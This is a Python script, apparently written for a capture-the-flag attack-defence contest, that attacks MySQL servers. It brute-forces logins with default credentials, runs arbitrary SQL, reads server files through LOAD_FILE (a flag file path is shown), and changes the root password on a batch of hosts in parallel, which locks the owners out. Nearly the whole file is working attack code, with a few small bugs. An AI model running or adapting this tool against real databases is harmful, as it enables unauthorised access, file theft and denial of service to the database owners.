#!/usr/bin/python3
# -*- coding:utf-8 -*-

import pymysql
import queue
import threading
import pysnooper
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Pool



# 尝试登陆的函数模块
# @pysnooper.snoop()
def try_login(params):
    user = params['user']
    pwd = params['pwd']
    port = params['port']
    host = params['host']
    try:
        db = pymysql.connect(host=host, port=port, user=user, password=pwd, connect_timeout=2)
        print(f"[+]try_login Success! {host}:{user}:{pwd}")
        # 关闭数据库连接,防止阻塞
        db.close()
        return host + ':' + user + ':' + pwd
    except Exception as e:
        if "using password" in str(e):
            print("[-]try_login Fail! password Error!")
        else:
            print(e)
        return False

# 简单、少量的密码fuzz
# @pysnooper.snoop()
def fuzz_pass(host, port, thread_num=20):
    user = ['root', 'admin', 'user', 'test']
    password = ['123456', 'root', '123', '', 'test']
    # 创建线程池
    with ThreadPoolExecutor(max_workers=thread_num) as t:
        args = []
        for u in user:
            for p in password:
                params = {}
                params['user'] = u
                params['pwd'] = p
                params['port'] = port
                params['host'] = host
                args.append(params)
        res = t.map(try_login, args)
        return [t for t in res if t]

# 执行单条sql语句
# @pysnooper.snoop()
def exec_sql(host, port, user, pwd, sql):
    try:
        # 建立连接
        db = pymysql.connect(host=host, port=port, user=user, password=pwd)
        try:
            cursor = db.cursor()
            # 执行SQL语句
            cursor.execute(sql)
            # 进行提交
            db.commit()
            # 获取执行结果
            res = cursor.fetchall()
            return res

        except Exception as e:
            print(f"[-]exec_sql Fail:{host}:{e}")
            return False

        # 及时断开链接防止堵塞
        db.close()

    except Exception as e:
        print(f"[-]exec_sql Fail! Exception:{host}")
        return False

# 修改当前登录用户的密码
# @pysnooper.snoop()
def change_current_pass(host, port ,user, pwd, newpwd):
    sql = f"ALTER USER USER() IDENTIFIED BY '{newpwd}';"
    result = exec_sql(host, port, user, pwd, sql)
    if result == ():
        print(f"[+] change_current_pass Success! {host}:{newpwd}")
        exec_sql(host, port, user, pwd, "flush privileges;")
        return True
    else:
        print(f"[-] change_current_pass Fail! {host}")
        return False

# 批量读取文件内容
def load_file(host, port, user, pwd, filePath):
    #要读取的文件路径
    sql = f"select load_file('{filePath}');"
    result = exec_sql(host, port, user, pwd, sql)
    try:
        if result[0][0]:
            return result
        else:
            print(f"[-]load_file Fail! try:{host}:{e}")
            return False
    except Exception as e:
        print(f"[-]load_file Fail! Exception:{host}:{e}")
        return False

# 批量攻击
def attack_others():
    # 生成目标
    config = {
        # 获得目标的类型: file文件读取 custom自己生成
        'type': 'custom'
    }
    targets = []
    if config['type'] == 'file':
        filename = "list.txt"
        with open(filename, 'r') as f:
            for line in f:
                # host, user, pwd, port = line.strip().split(':')
                targets.appen(line.strip())
    elif config['type'] == 'custom':
        user = 'root'
        pwd = '123456'
        port = '3308'
        # with open("ip.txt", r) as f:
        #     for ip in f:
        #         target = ip.strip() + ':' + user + ':' + pwd + ':' + port
        #         targets.append(target)
        cIP = '127.0.0.{i}'
        for i in range(1, 10):
            ip = cIP.format(i=i)
            target = ip.strip() + ':' + user + ':' + pwd + ':' + port
            targets.append(target)
    # 输出生成的目标
    print(targets)
    # 开始对目标开始攻击
    success_result = []
    # 单进程单线程版
    # print("正在启动单进程攻击!")
    # for ip in targets:
    #     # 修改当前登录密码
    #     newpwd = '123456'
    #     host, user, pwd, port = ip.split(':')
    #     result = change_current_pass(host, int(port) ,user, pwd, newpwd)
    #     if result:
    #         print(f"[+] attack_others>change_current_pass Success!")
    #         success_result.append(host)
    #     else:
    #         print(f"[+] attack_others>change_current_pass Fail!")
    # #输出最终成功的结果
    # print("[+] Success Count:{count}".format(count=len(success_result)))
    # print(success_result)
    # 多进程版
    print("正在启动多进程攻击!")
    p = Pool(10)
    result = []
    for ip in targets:
        newpwd = '123456'
        host, user, pwd, port = ip.split(':')
        resProcess = p.apply_async(change_current_pass, args=(host, int(port) ,user, pwd, newpwd))
        result.append(resProcess)
    p.close()
    p.join()
    success_result = [x.get() for x in result if x.get()]
    print("[+] Success Count:{count}".format(count=len(success_result)))
    print(success_result)
    print("All attack Done!")


def main():
    user = 'root'
    pwd = '1234566'
    port = 3308
    host = '127.0.0.1'
    # try_login(user, pwd, port, host)
    # print(fuzz_pass(host, port))
    # sql = "select @@version"
    # exec_sql(host, port, user, pwd, sql)
    # change_current_pass(host, port, user, pwd, '1234566')
    # load_file(host, port, user, pwd, '/var/lib/mysql-files/flag')
    attack_others()

if __name__ == '__main__':
    main()